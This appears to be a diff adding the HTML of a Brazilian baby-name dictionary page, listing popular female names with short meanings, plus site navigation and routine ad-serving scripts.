+                                                                                                            <img src="images/nomes-femininos-diferentes-para-bebe-significados-artc.jpg" alt="73 nomes femininos diferentes para bebê e os seus significados" width="210" height="140">
+                                                                                                        <span>73 nomes femininos diferentes para bebê e os seus significados</span>
+                                                </a>
+                                            </li>
+                                                                                    <li>
+                                                <a href="/nomes-femininos-para-bebe/">
+                                                                                                            <img src="images/nomes-femininos-para-bebe-artc.jpg" alt="Nomes femininos para bebê: 229 ideias" width="210" height="140">
+                                                                                                        <span>Nomes femininos para bebê: 229 ideias</span>
+                                                </a>
+                                            </li>
+                                                                                    <li>
+                                                <a href="/nomes-femininos-terminados-em-ana/">
+                                                                                                            <img src="images/nomes-femininos-terminados-em-ana-lindos-e-delicados-artc.jpg" alt="52 nomes femininos terminados em ana (lindos e delicados)" width="210" height="140">
+                                                                                                        <span>52 nomes femininos terminados em ana (lindos e delicados)</span>
+                                                </a>
+                                            </li>
+                                                                                    <li>
+                                                <a href="/nomes-femininos-terminados-em-ela/">
+                                                                                                            <img src="images/nomes-femininos-terminados-em-ela-artc.jpg" alt="25 nomes femininos terminados em Ela para você se inspirar" width="210" height="140">
+                                                                                                        <span>25 nomes femininos terminados em Ela para você se inspirar</span>
+                                                </a>
+                                            </li>
+                                                                            </ul>
+                                </div>
+                            
+                        
+                                                    <div class="list-wide-wrap">
+                                                                    <h2 class="list-title">Lista de Nomes Femininos Mais Vistos </h2>
+                                
+                                <ul class="list-wide">
+                                    
+                                    <li>
+                                        <a href="/leticia/" class="full-w">
+                                            <span class="list-wide--name full-w">Letícia</span>
+                                            <span class="list-wide--desc full-w"> Significa "mulher alegre", "mulher que transmite felicidade".
+
+O nome feminino Letícia emana alegria e felicidade. Isso acontece, pois ele tem origem a partir...</span>
+                                        </a>
+                                    </li>
+
+                                    
+                                    <li>
+                                        <a href="/isabela/" class="full-w">
+                                            <span class="list-wide--name full-w">Isabela</span>
+                                            <span class="list-wide--desc full-w"> Significa “casta”, “pura”, "Deus é juramento" ou "consagrada a Deus".
+
+Isabela é uma variante do nome Isabel, que tem origem no nome hebraico Izebel,...</span>
+                                        </a>
+                                    </li>
+
+                                    
+                                    <li>
+                                        <a href="/camila/" class="full-w">
+                                            <span class="list-wide--name full-w">Camila</span>
+                                            <span class="list-wide--desc full-w"> Significa "a sacerdotisa", "servidora de uma divindade", "mensageira dos deuses", "menina de coro" e "perfeição".
+
+Há diferentes possibilidades de origem...</span>
+                                        </a>
+                                    </li>
+
+                                    
+                                    <li>
+                                        <a href="/valentina/" class="full-w">
+                                            <span class="list-wide--name full-w">Valentina</span>
+                                            <span class="list-wide--desc full-w"> Significa “valente”, “forte”, “vigorosa”, “cheia de saúde”.
+
+Belo, imponente e cheio de feminilidade, o nome Valentina é a variante feminina...</span>
+                                        </a>
+                                    </li>
+
+                                    
+                                    <li>
+                                        <a href="/luana/" class="full-w">
+                                            <span class="list-wide--name full-w">Luana</span>
+                                            <span class="list-wide--desc full-w"> Significa “a reluzente”; “combatente gloriosa cheia de graça”, “guerreira famosa e graciosa”; “aproveitar”, “prazer”, “leoa”. 
+
+O...</span>
+                                        </a>
+                                    </li>
+
+                                    
+                                    <li>
+                                        <a href="/yasmin/" class="full-w">
+                                            <span class="list-wide--name full-w">Yasmin</span>
+                                            <span class="list-wide--desc full-w"> Significa “jasmim”, “flor de jasmim”, "flor perfumada".
+
+O nome feminino Yasmin exala beleza e doçura. Ele está diretamente ligado à flor de jasmim,...</span>
+                                        </a>
+                                    </li>
+
+                                    
+                                    <li>
+                                        <a href="/sophia/" class="full-w">
+                                            <span class="list-wide--name full-w">Sophia</span>
+                                            <span class="list-wide--desc full-w"> Significa “sabedoria” e "sabedoria divina".
+
+Sophia tem origem no grego sophia, que quer dizer literalmente “sabedoria”.
+
+O nome é traduzido muitas...</span>
+                                        </a>
+                                    </li>
+
+                                    
+                                    <li>
+                                        <a href="/juliana/" class="full-w">
+                                            <span class="list-wide--name full-w">Juliana</span>
+                                            <span class="list-wide--desc full-w"> Significa “jovem”, "aquela que tem os cabelos negros", aquela com pelagem escura", “filha de Júpiter”.
+
+O belo e delicado nome feminino Juliana é a...</span>
+                                        </a>
+                                    </li>
+
+                                    
+                                    <li>
+                                        <a href="/isadora/" class="full-w">
+                                            <span class="list-wide--name full-w">Isadora</span>
+                                            <span class="list-wide--desc full-w"> Significa "dada por Ísis" ou "dádiva de Ísis".
+
+A origem do nome Isadora é o grego Isídoros, formado pelas palavras Isis (nome da deusa egípcia) e dôron,...</span>
+                                        </a>
+                                    </li>
+
+                                    
+                                    <li>
+                                        <a href="/bruna/" class="full-w">
+                                            <span class="list-wide--name full-w">Bruna</span>
+                                            <span class="list-wide--desc full-w"> Significa “morena”, "bronzeada", "marrom"; "da cor do fogo".
+
+Com uma sonoridade bela e significados históricos, o nome Bruna se tornou um dos preferidos...</span>
+                                        </a>
+                                    </li>
+
+                                                                    </ul>
+                                <div class="np ad">
+                                                                            <div class="ad-mrec ad-list visible-xs">
+                                            <style> @media (min-width:0px){#div-gpt-sg-d635bb963154acc213946d180f366c18 > div{width:0;height:0;}#div-gpt-sg-d635bb963154acc213946d180f366c18{height:0;}}@media (min-width:300px){#div-gpt-sg-d635bb963154acc213946d180f366c18 > div{width:300px;height:290px;}#div-gpt-sg-d635bb963154acc213946d180f366c18{height:290px;}}@media (min-width:336px){#div-gpt-sg-d635bb963154acc213946d180f366c18 > div{width:336px;height:320px;}#div-gpt-sg-d635bb963154acc213946d180f366c18{height:320px;}}@media (min-width:768px){#div-gpt-sg-d635bb963154acc213946d180f366c18 > div{width:468px;height:100px;}#div-gpt-sg-d635bb963154acc213946d180f366c18{height:100px;}}@media (min-width:1280px){#div-gpt-sg-d635bb963154acc213946d180f366c18 > div{width:728px;height:130px;}#div-gpt-sg-d635bb963154acc213946d180f366c18{height:130px;}}#div-gpt-sg-d635bb963154acc213946d180f366c18{position:sticky;padding:0px;padding-top:20px;z-index:0;overflow:hidden;}#div-gpt-sg-d635bb963154acc213946d180f366c18::before{z-index:-1;}#div-gpt-sg-d635bb963154acc213946d180f366c18 > div{margin:auto;position:unset;}#div-gpt-sg-d635bb963154acc213946d180f366c18 > div::before, #div-gpt-sg-d635bb963154acc213946d180f366c18::after{top:0;position:absolute;}</style><div id="div-gpt-sg-d635bb963154acc213946d180f366c18" class="ad-unit ad-unit--pt-br #div-gpt-sg-d635bb963154acc213946d180f366c18"></div>                                        </div>
+                                                                    </div>
+                                <ul class="list-wide">
+                                    
+                                    <li>
+                                        <a href="/fernanda/" class="full-w">
+                                            <span class="list-wide--name full-w">Fernanda</span>
+                                            <span class="list-wide--desc full-w"> Significa “ousada para atingir a paz”, “a que ousa viajar", "viajante corajosa”.
+
+Forte, imponente e repleto de significados grandiosos, o nome Fernanda...</span>
+                                        </a>
+                                    </li>
+
+                                    
+                                    <li>
+                                        <a href="/luiza/" class="full-w">
+                                            <span class="list-wide--name full-w">Luiza</span>
+                                            <span class="list-wide--desc full-w"> Significa “combatente gloriosa”, “guerreira ilustre”, “gloriosa nas batalhas”.
+
+O bonito nome feminino Luiza carrega fortes significados...</span>
+                                        </a>
+                                    </li>
+
+                                    
+                                    <li>
+                                        <a href="/vitoria/" class="full-w">
+                                            <span class="list-wide--name full-w">Vitória</span>
+                                            <span class="list-wide--desc full-w"> Significa “vitória”, “vitoriosa”, “vencedora”.
+
+Um nome forte e com um significado literal imponente, Vitória tem origem no latim victoria, que...</span>
+                                        </a>
+                                    </li>
+
+                                    
+                                    <li>
+                                        <a href="/ester/" class="full-w">
+                                            <span class="list-wide--name full-w">Ester</span>
+                                            <span class="list-wide--desc full-w"> Significa "estrela".
+
+Um nome curto, elegante e com um significado iluminado, Esther tem origem no hebraico. Este nome tem relação com as seguintes palavras:...</span>
+                                        </a>
+                                    </li>
+
+                                    
+                                    <li>
+                                        <a href="/manuela/" class="full-w">
+                                            <span class="list-wide--name full-w">Manuela</span>
+                                            <span class="list-wide--desc full-w"> Significa "Deus está conosco" ou "Deus conosco".
+
+Manuela é a forma feminina de Manuel, uma variante de Emanuel, nome originado a partir do hebraico...</span>
+                                        </a>
+                                    </li>
+
+                                    
+                                    <li>
+                                        <a href="/melissa/" class="full-w">
+                                            <span class="list-wide--name full-w">Melissa</span>
+                                            <span class="list-wide--desc full-w"> Significa “abelha”, “mel”. 
+
+O bonito nome feminino Melissa possui uma sonoridade agradável e significados doces. Ele surge a partir da palavra grega...</span>
+                                        </a>
+                                    </li>
+
+                                    
+                                    <li>
+                                        <a href="/jessica/" class="full-w">
+                                            <span class="list-wide--name full-w">Jéssica</span>
+                                            <span class="list-wide--desc full-w"> Significa “Deus contempla”, "a observadora".
+
+O belo nome feminino Jéssica é poético e apresenta uma sonoridade agradável. Ele teria sido utilizado pela...</span>
+                                        </a>
+                                    </li>
+
+                                    
+                                    <li>
+                                        <a href="/gabriela/" class="full-w">
+                                            <span class="list-wide--name full-w">Gabriela</span>
+                                            <span class="list-wide--desc full-w"> Significa “mulher de Deus”, “mulher forte de Deus” ou “fortaleza de Deus”.
+
+Os significados atrelados ao nome Gabriela evocam força e...</span>
+                                        </a>
+                                    </li>
+
+                                    
+                                    <li>
+                                        <a href="/carolina/" class="full-w">
+                                            <span class="list-wide--name full-w">Carolina</span>
+                                            <span class="list-wide--desc full-w"> Significa “mulher do povo”, "mulher doce".
+
+Imponente, forte e, ao mesmo tempo, delicado, o nome feminino Carolina surgiu como o diminutivo do nome...</span>
+                                        </a>
+                                    </li>
+
+                                    
+                                    <li>
+                                        <a href="/bianca/" class="full-w">
+                                            <span class="list-wide--name full-w">Bianca</span>
+                                            <span class="list-wide--desc full-w"> Significa "branca", "alva", "cândida".
+
+Belo, delicado e eternizado pelas obras do escritor William Shakespeare, o nome feminino Bianca tem origem italiana e...</span>
+                                        </a>
+                                    </li>
+
+                                                                    </ul>
+
+                                <div class="pagination pagination-number w-630 mt-10"><span class="pag-btn pag-btn--active">1</span><a class="pag-btn" href="/nomes-femininos/2/">2</a><a class="pag-btn" href="/nomes-femininos/3/">3</a><a class="pag-btn" href="/nomes-femininos/4/">4</a><a class="pag-btn" href="/nomes-femininos/5/">5</a><a class="pag-btn pag-btn--next" href="/nomes-femininos/2/" title="Seguinte"></a></div>                            </div>
+                        
+                        
+                        
+                                            </div>
+                </div>
+            </div>
+            <div class="content-aside col-md-4">
+                    <div id="top-sidebar" class="top-sidebar">
+                <div class="name-grid-wrap">
+            <div class="name-grid">
+                <div class="sidebar-title">
+                    <a href="/nomes-femininos/">Nomes Femininos</a>
+                </div>
+                <i class="icon icon-female"></i>
+                <ul>
+                                            <li><a class="feminino" href="/nomes-femininos/a/" title="Nomes Femininos com A">A</a>
+                        </li>
+                                            <li><a class="feminino" href="/nomes-femininos/b/" title="Nomes Femininos com B">B</a>
+                        </li>
+                                            <li><a class="feminino" href="/nomes-femininos/c/" title="Nomes Femininos com C">C</a>
+                        </li>
+                                            <li><a class="feminino" href="/nomes-femininos/d/" title="Nomes Femininos com D">D</a>
+                        </li>
+                                            <li><a class="feminino" href="/nomes-femininos/e/" title="Nomes Femininos com E">E</a>
+                        </li>
+                                            <li><a class="feminino" href="/nomes-femininos/f/" title="Nomes Femininos com F">F</a>
+                        </li>
+                                            <li><a class="feminino" href="/nomes-femininos/g/" title="Nomes Femininos com G">G</a>
+                        </li>
+                                            <li><a class="feminino" href="/nomes-femininos/h/" title="Nomes Femininos com H">H</a>
+                        </li>
+                                            <li><a class="feminino" href="/nomes-femininos/i/" title="Nomes Femininos com I">I</a>
+                        </li>
+                                            <li><a class="feminino" href="/nomes-femininos/j/" title="Nomes Femininos com J">J</a>
+                        </li>
+                                            <li><a class="feminino" href="/nomes-femininos/k/" title="Nomes Femininos com K">K</a>
+                        </li>
+                                            <li><a class="feminino" href="/nomes-femininos/l/" title="Nomes Femininos com L">L</a>
+                        </li>
+                                            <li><a class="feminino" href="/nomes-femininos/m/" title="Nomes Femininos com M">M</a>
+                        </li>
+                                            <li><a class="feminino" href="/nomes-femininos/n/" title="Nomes Femininos com N">N</a>
+                        </li>
+                                            <li><a class="feminino" href="/nomes-femininos/o/" title="Nomes Femininos com O">O</a>
+                        </li>
+                                            <li><a class="feminino" href="/nomes-femininos/p/" title="Nomes Femininos com P">P</a>
+                        </li>
+                                            <li><a class="feminino" href="/nomes-femininos/q/" title="Nomes Femininos com Q">Q</a>
+                        </li>
+                                            <li><a class="feminino" href="/nomes-femininos/r/" title="Nomes Femininos com R">R</a>
+                        </li>
+                                            <li><a class="feminino" href="/nomes-femininos/s/" title="Nomes Femininos com S">S</a>
+                        </li>
+                                            <li><a class="feminino" href="/nomes-femininos/t/" title="Nomes Femininos com T">T</a>
+                        </li>
+                                            <li><a class="feminino" href="/nomes-femininos/u/" title="Nomes Femininos com U">U</a>
+                        </li>
+                                            <li><a class="feminino" href="/nomes-femininos/v/" title="Nomes Femininos com V">V</a>
+                        </li>
+                                            <li><a class="feminino" href="/nomes-femininos/w/" title="Nomes Femininos com W">W</a>
+                        </li>
+                                            <li><a class="feminino" href="/nomes-femininos/x/" title="Nomes Femininos com X">X</a>
+                        </li>
+                                            <li><a class="feminino" href="/nomes-femininos/y/" title="Nomes Femininos com Y">Y</a>
+                        </li>
+                                            <li><a class="feminino" href="/nomes-femininos/z/" title="Nomes Femininos com Z">Z</a>
+                        </li>
+                                        <li><a href="/nomes-femininos/" title="Todos os Nomes Femininos">Todos</a></li>
+                </ul>
+            </div>
+            <div class="name-grid">
+                <div class="sidebar-title">
+                    <a href="/nomes-masculinos/">Nomes Masculinos</a>
+                </div>
+                <i class="icon icon-male"></i>
+                <ul>
+                                            <li><a href="/nomes-masculinos/a/" title="Nomes Masculinos com A">A</a>
+                        </li>
+                                            <li><a href="/nomes-masculinos/b/" title="Nomes Masculinos com B">B</a>
+                        </li>
+                                            <li><a href="/nomes-masculinos/c/" title="Nomes Masculinos com C">C</a>
+                        </li>
+                                            <li><a href="/nomes-masculinos/d/" title="Nomes Masculinos com D">D</a>
+                        </li>
+                                            <li><a href="/nomes-masculinos/e/" title="Nomes Masculinos com E">E</a>
+                        </li>
+                                            <li><a href="/nomes-masculinos/f/" title="Nomes Masculinos com F">F</a>
+                        </li>
+                                            <li><a href="/nomes-masculinos/g/" title="Nomes Masculinos com G">G</a>
+                        </li>
+                                            <li><a href="/nomes-masculinos/h/" title="Nomes Masculinos com H">H</a>
+                        </li>
+                                            <li><a href="/nomes-masculinos/i/" title="Nomes Masculinos com I">I</a>
+                        </li>
+                                            <li><a href="/nomes-masculinos/j/" title="Nomes Masculinos com J">J</a>
+                        </li>
+                                            <li><a href="/nomes-masculinos/k/" title="Nomes Masculinos com K">K</a>
+                        </li>
+                                            <li><a href="/nomes-masculinos/l/" title="Nomes Masculinos com L">L</a>
+                        </li>
+                                            <li><a href="/nomes-masculinos/m/" title="Nomes Masculinos com M">M</a>
+                        </li>
+                                            <li><a href="/nomes-masculinos/n/" title="Nomes Masculinos com N">N</a>
+                        </li>
+                                            <li><a href="/nomes-masculinos/o/" title="Nomes Masculinos com O">O</a>
+                        </li>
+                                            <li><a href="/nomes-masculinos/p/" title="Nomes Masculinos com P">P</a>
+                        </li>
+                                            <li><a href="/nomes-masculinos/q/" title="Nomes Masculinos com Q">Q</a>
+                        </li>
+                                            <li><a href="/nomes-masculinos/r/" title="Nomes Masculinos com R">R</a>
+                        </li>
+                                            <li><a href="/nomes-masculinos/s/" title="Nomes Masculinos com S">S</a>
+                        </li>
+                                            <li><a href="/nomes-masculinos/t/" title="Nomes Masculinos com T">T</a>
+                        </li>
+                                            <li><a href="/nomes-masculinos/u/" title="Nomes Masculinos com U">U</a>
+                        </li>
+                                            <li><a href="/nomes-masculinos/v/" title="Nomes Masculinos com V">V</a>
+                        </li>
+                                            <li><a href="/nomes-masculinos/w/" title="Nomes Masculinos com W">W</a>
+                        </li>
+                                            <li><a href="/nomes-masculinos/x/" title="Nomes Masculinos com X">X</a>
+                        </li>
+                                            <li><a href="/nomes-masculinos/y/" title="Nomes Masculinos com Y">Y</a>
+                        </li>
+                                            <li><a href="/nomes-masculinos/z/" title="Nomes Masculinos com Z">Z</a>
+                        </li>
+                                        <li><a href="/nomes-masculinos/" title="Todos os Nomes Masculinos">Todos</a></li>
+                </ul>
+            </div>
+        </div>
+    </div>
+
+                <div class="sidebar-bottom">
+                            <div class="list-mod-wrap mt-30 mb-30">
+            <h2 class="list-mod--title">Últimas Atualizações</h2>
+            <ul class="list-mod--list col-2 list-mod--list-border list-latest t-center">
+                                            <li>
+                            <a href="/nala/"><span>Nala</span></a>
+                        </li>
+                                            <li>
+                            <a href="/briana/"><span>Briana</span></a>
+                        </li>
+                                            <li>
+                            <a href="/aline/"><span>Aline</span></a>
+                        </li>
+                                            <li>
+                            <a href="/amanda/"><span>Amanda</span></a>
+                        </li>
+                                            <li>
+                            <a href="/isabelle/"><span>Isabelle</span></a>
+                        </li>
+                                            <li>
+                            <a href="/penina/"><span>Penina</span></a>
+                        </li>
+                                            <li>
+                            <a href="/celine/"><span>Celine</span></a>
+                        </li>
+                                            <li>
+                            <a href="/ana/"><span>Ana</span></a>
+                        </li>
+                                            <li>
+                            <a href="/ana-luisa/"><span>Ana Luísa</span></a>
+                        </li>
+                                            <li>
+                            <a href="/lorrane/"><span>Lorrane</span></a>
+                        </li>
+                                </ul>
+        </div>
+                            <div class="list-mod-wrap mt-30 mb-30">
+                <div class="list-mod--title">Categorias em destaque</div>
+                <ul class="list-mod--list col-2 list-mod--list-border t-center">
+                                            <li>
+                            <a href="/nomes-biblicos/"><span>Nomes Bíblicos</span></a>
+                        </li>
+                                            <li>
+                            <a href="/nomes-italianos/"><span>Nomes Italianos</span></a>
+                        </li>
+                                            <li>
+                            <a href="/nomes-gregos/"><span>Nomes Gregos</span></a>
+                        </li>
+                                            <li>
+                            <a href="/nomes-hebraicos/"><span>Nomes Hebraicos</span></a>
+                        </li>
+                                            <li>
+                            <a href="/nomes-ingleses/"><span>Nomes Ingleses</span></a>
+                        </li>
+                                            <li>
+                            <a href="/nomes-japoneses/"><span>Nomes Japoneses</span></a>
+                        </li>
+                                            <li>
+                            <a href="/nomes-franceses/"><span>Nomes Franceses</span></a>
+                        </li>
+                                            <li>
+                            <a href="/nomes-indigenas/"><span>Nomes Indígenas</span></a>
+                        </li>
+                                            <li>
+                            <a href="/nomes-arabes/"><span>Nomes Árabes</span></a>
+                        </li>
+                                            <li>
+                            <a href="/nomes-mitologicos/"><span>Nomes Mitológicos</span></a>
+                        </li>
+                                        <li class="full-w see-all"><a href="/categorias/"><span>Todas as Categorias</span></a></li>
+                </ul>
+
+            </div>
+        
+            </div>
+
+            </div>
+        </div>
+    </div>
+
+
+    <div class="row">
+        <div class="col-xs-12">
+            <div class="ad-leaderboard-desktop_mrec-mobile">
+                <style> @media (min-width:0px){#div-gpt-sg-4935e8baebbb53475070b004917bcab1 > div{width:0;height:0;}#div-gpt-sg-4935e8baebbb53475070b004917bcab1{height:0;}}@media (min-width:300px){#div-gpt-sg-4935e8baebbb53475070b004917bcab1 > div{width:300px;height:290px;}#div-gpt-sg-4935e8baebbb53475070b004917bcab1{height:290px;}}@media (min-width:336px){#div-gpt-sg-4935e8baebbb53475070b004917bcab1 > div{width:336px;height:320px;}#div-gpt-sg-4935e8baebbb53475070b004917bcab1{height:320px;}}@media (min-width:768px){#div-gpt-sg-4935e8baebbb53475070b004917bcab1 > div{width:728px;height:130px;}#div-gpt-sg-4935e8baebbb53475070b004917bcab1{height:130px;}}@media (min-width:990px){#div-gpt-sg-4935e8baebbb53475070b004917bcab1 > div{width:970px;height:130px;}#div-gpt-sg-4935e8baebbb53475070b004917bcab1{height:130px;}}#div-gpt-sg-4935e8baebbb53475070b004917bcab1{position:sticky;padding:0px;padding-top:20px;z-index:0;overflow:hidden;}#div-gpt-sg-4935e8baebbb53475070b004917bcab1::before{z-index:-1;}#div-gpt-sg-4935e8baebbb53475070b004917bcab1 > div{margin:auto;position:unset;}#div-gpt-sg-4935e8baebbb53475070b004917bcab1 > div::before, #div-gpt-sg-4935e8baebbb53475070b004917bcab1::after{top:0;position:absolute;}</style><div id="div-gpt-sg-4935e8baebbb53475070b004917bcab1" class="ad-unit ad-unit--pt-br #div-gpt-sg-4935e8baebbb53475070b004917bcab1"></div>            </div>
+        </div>
+    </div>
+
+
+</div>
+
+
+
+<footer id="footer" class="footer mt-30">
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12">
+                <ul id="footer-list" class="footer-list footer-list--highlight">
+                    <li><a href="/ultimos-nomes/">Últimos Nomes</a></li>
+                    <li><a href="/nomes-pelo-mundo/">Nomes pelo Mundo</a></li>
+                    <li><a href="/bebes/">Nomes de Bebês</a></li>
+                </ul>
+                <ul class="footer-list footer-list--org">
+                    <li><a href="/sobre/">Sobre Nós</a></li>
+                    <li><a href="/politica-privacidade/">Política de Privacidade</a></li>
+                    <li><a href="https://www.7graus.com/MediaKit-PT-BR.pdf" rel="nofollow" target="_blank">Anuncie</a></li>
+                    <li><a href="/termos-uso/">Termos de Uso</a></li>
+                    <li><a href="/contato/">Contato</a></li>
+                    <li><a href="/rss.php">RSS</a></li>
+                </ul>
+                <div class="copyright">
+                    <span class="info">Significado dos Nomes</span>
+                    <span class="separator"> - </span>
+                    <span class="info">Dicionário de Nomes Próprios</span>
+                    <br>
+                    <span>� 2008 - 2026 <a href="https://www.7graus.com/" rel="co-worker nofollow">7Graus</a>.</span>
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+
+    <script type="text/javascript" src="js/dnp_103.js" async=""></script>
+
+            <script async="" src="js/adsbygoogle.js"></script>
+        <script>
+            (adsbygoogle = window.adsbygoogle || []).push({
+                google_ad_client: 'pub-7683395268562108',
+                enable_page_level_ads: false,
+                vignettes: {google_ad_channel: '1709994476'},
+                overlays: {google_ad_channel: '9233261270'}
+            });
+        </script>
+    
+            <script>
+            (function () {
+                var f = function () {
+                    dnp.initMobileOnly();
+                };
+                window[window.attachEvent ? 'attachEvent' : 'addEventListener'](window.attachEvent ? 'onload' : 'load', f, false);
+            })();
+        </script>
+    <script>(function(){googletag.cmd.push(function(){googletag.pubads().setTargeting('pathname', window.location.pathname.endsWith("/")&&window.location.pathname!=="/"?window.location.pathname.slice(1,-1):window.location.pathname?window.location.pathname:"/");googletag.pubads().enableLazyLoad({"fetchMarginPercent":200,"renderMarginPercent":100,"mobileScaling":1});googletag.pubads().disableInitialLoad();googletag.enableServices();var sm0=googletag.sizeMapping().addSize([0,0],[]).addSize([300,0],[[300,250],[250,250]]).addSize([336,0],[[336,280],[300,250],[250,250]]).addSize([768,0],[[468,60],[320,50],[300,50],[234,60]]).addSize([1280,0],[[728,90],[468,60]]).build(),sm1=googletag.sizeMapping().addSize([0,0],[]).addSize([300,0],[[300,250],[250,250]]).addSize([336,0],[[336,280],[300,250],[250,250]]).addSize([768,0],[[728,90],[468,60]]).addSize([990,0],[[970,90],[728,90],[970,66],[468,60]]).build();var ss0=[[728,90],[468,60],[336,280],[320,50],[300,250],[300,50],[250,250],[234,60]],ss1=[[970,90],[970,66],[728,90],[468,60],[336,280],[300,250],[250,250]];s0=googletag.defineSlot('/1062898/DICIONARIONOMESPROPRIOS_BR_LIST_INCONTENT1',ss0,'div-gpt-sg-ee5ecc5de0c6d686a3d0b8914b62da9c').defineSizeMapping(sm0).addService(googletag.pubads()),s1=googletag.defineSlot('/1062898/DICIONARIONOMESPROPRIOS_BR_LIST_INCONTENT2',ss0,'div-gpt-sg-d635bb963154acc213946d180f366c18').defineSizeMapping(sm0).addService(googletag.pubads()),s2=googletag.defineSlot('/1062898/DICIONARIONOMESPROPRIOS_BR_ROS_BOTTOM',ss1,'div-gpt-sg-4935e8baebbb53475070b004917bcab1').defineSizeMapping(sm1).addService(googletag.pubads());var slots=[s0,s1,s2];slots.forEach(function(s){googletag.display(s.getSlotElementId())});function debugScript(debug = false, message, slot) {
+                if (debug) {
+                    console.log(message, slot);
+                }
+            }
+            const sgIntervalRefreshSlots = [{"adUnit":"\/1062898\/DICIONARIONOMESPROPRIOS_BR_LIST_INCONTENT1","refreshTime":16,"refreshRetryTime":30,"refreshRetryMaxAttempts":10,"retryTime":5},{"adUnit":"\/1062898\/DICIONARIONOMESPROPRIOS_BR_LIST_INCONTENT2","refreshTime":16,"refreshRetryTime":30,"refreshRetryMaxAttempts":10,"retryTime":5},{"adUnit":"\/1062898\/DICIONARIONOMESPROPRIOS_BR_ROS_BOTTOM","refreshTime":16,"refreshRetryTime":30,"refreshRetryMaxAttempts":10,"retryTime":5}];
+            window.sgIntervalRefreshAds = {
+                adunits: sgIntervalRefreshSlots,
+                slots: [],
+                debug: false
+            };
+            googletag.pubads().getSlots().map(slot => {
+                const intervalAd = sgIntervalRefreshSlots.find(intervalAd => intervalAd.adUnit === slot.getAdUnitPath());
+                if (intervalAd) {
+                    slot.sgIntervalAd = true;
+                    slot.sgIntervalRefreshTime = intervalAd.refreshTime;
+                    slot.sgIntervalTimeAdId = null;
+                    slot.sgIntervalIsVisible = false;
+                    slot.sgIntervalImpressionViewed = false;
+                    slot.sgRemainingTime = slot.sgIntervalRefreshTime; 
+                    slot.sgStartTime = null;
+                    slot.sgRefreshRetryTime = intervalAd.refreshRetryTime;
+                    slot.sgRefreshRetryMaxAttempts = intervalAd.refreshRetryMaxAttempts;
+                    window.sgIntervalRefreshAds.slots.push(slot);
+                }
+                return slot;
+            });
+            
+            function stopIntervalRefresh(slot) {
+                slot.sgRemainingTime = Math.round(slot.sgRemainingTime);
+                clearTimeout(slot.sgIntervalTimeAdId); 
+                slot.sgIntervalTimeAdId = null;
+                slot.sgIntervalIsVisible = false;
+                if (slot.sgStartTime) {
+                    slot.sgRemainingTime = Math.round(slot.sgIntervalRefreshTime - ((performance.now() - slot.sgStartTime) / 1000));
+                    if (slot.sgRemainingTime < 0) {
+                        slot.sgRemainingTime = slot.sgIntervalRefreshTime; 
+                    }
+                }
+            }
+            function startIntervalRefresh(slot) {
+                slot.sgRemainingTime = Math.round(slot.sgRemainingTime);
+                if (slot.sgRemainingTime < 0) {
+                    slot.sgRemainingTime = slot.sgIntervalRefreshTime;
+                }
+                slot.sgIntervalTimeAdId = setTimeout(function() {
+                    
+                (function() {
+                    slot.sgRequestManager = { 
+                        adserverRequestSent: false,
+                        aps: false,
+                        prebid: false
+                    };
+
+                    function biddersBack() {
+                        if (slot.sgRequestManager.aps && slot.sgRequestManager.prebid) {
+                            sendAdserverRequest();
+                        } 
+                        return;
+                    }
+
+                    function sendAdserverRequest() {
+                        if (slot.sgRequestManager.adserverRequestSent === true) {
+                            return;
+                        }
+                        slot.sgRequestManager.adserverRequestSent = true;
+                        googletag.cmd.push(function() {
+                            googletag.pubads().refresh([slot]);
+                        });
+                    }
+
+                    const apsRefreshSlot = {
+                        slotID: slot.getSlotElementId(),
+                        sizes: slot.getSizes().map(size => [size.getWidth(), size.getHeight()])
+                    };
+
+                    apstag.fetchBids({slots: [apsRefreshSlot], timeout: 2000},
+                        function(bids) {
+                            googletag.cmd.push(function(){
+                                apstag.setDisplayBids();
+                                slot.sgRequestManager.aps = true;
+                                biddersBack();
+                            });
+                    });
+
+                    pbjs.que.push(function() {
+                        pbjs.requestBids({
+                            timeout: 2000,
+                            adUnitCodes: [slot.getSlotElementId()],
+                            bidsBackHandler: function() {
+                                pbjs.setTargetingForGPTAsync([slot.getSlotElementId()]);
+                                slot.sgRequestManager.prebid = true;
+                                biddersBack(); 
+                            }
+                        });
+                    });
+
+                    window.setTimeout(function() {
+                        sendAdserverRequest();
+                    }, 2500); 
+                })();
+                
+                    slot.sgRemainingTime = slot.sgIntervalRefreshTime;
+                    slot.sgStartTime = performance.now();
+                }, slot.sgRemainingTime * 1000);
+                if (!slot.sgStartTime) {
+                    slot.sgStartTime = performance.now();
+                }
+                slot.sgIntervalIsVisible = true;
+            }
+            
+            googletag.pubads().addEventListener("impressionViewable", (event) => {
+                if (event.slot.sgIntervalAd) {
+                    event.slot.sgIntervalImpressionViewed = true;
+                    debugScript(sgIntervalRefreshAds.debug,`impressionViewable interval: ${event.slot.getAdUnitPath()} | should refresh in ${event.slot.sgRemainingTime}s`, event.slot);
+                    startIntervalRefresh(event.slot);
+                }
+            });
+            googletag.pubads().addEventListener("slotVisibilityChanged", (event) => {
+                if (event.slot.sgIntervalAd) {
+                    if (event.inViewPercentage < 50 && event.slot.sgIntervalTimeAdId) {
+                        stopIntervalRefresh(event.slot);
+                        debugScript(sgIntervalRefreshAds.debug,`slotVisibilityChanged pause interval at ${event.slot.sgRemainingTime}s refresh: ${event.slot.getAdUnitPath()} | visible area: ${event.inViewPercentage}%`, event.slot);
+                    }
+                    if (
+                        event.inViewPercentage >= 50 &&
+                        event.slot.sgIntervalImpressionViewed && 
+                        !event.slot.sgIntervalIsVisible && 
+                        !event.slot.sgIntervalTimeAdId
+                    ) {
+                        startIntervalRefresh(event.slot);
+                        debugScript(sgIntervalRefreshAds.debug,`slotVisibilityChanged resume interval at ${event.slot.sgRemainingTime}s refresh: ${event.slot.getAdUnitPath()} | visible area: ${event.inViewPercentage}%, should refresh in ${event.slot.sgRemainingTime}s`, event.slot);
+                    }
+                }
+            });
+            
+            googletag.pubads().addEventListener("slotRenderEnded", function(event) {
+                const slot = event.slot;
+                if (!slot.sgIntervalAd) {
+                    return;
+                }
+                
+                // Verificar se o retryTime está definido e é um número válido
+                if (typeof slot.sgRefreshRetryTime !== "number" || isNaN(slot.sgRefreshRetryTime)) {
+                    console.warn(`Retry time não configurado corretamente para o slot: ${slot.getAdUnitPath()}`);
+                    return;
+                }
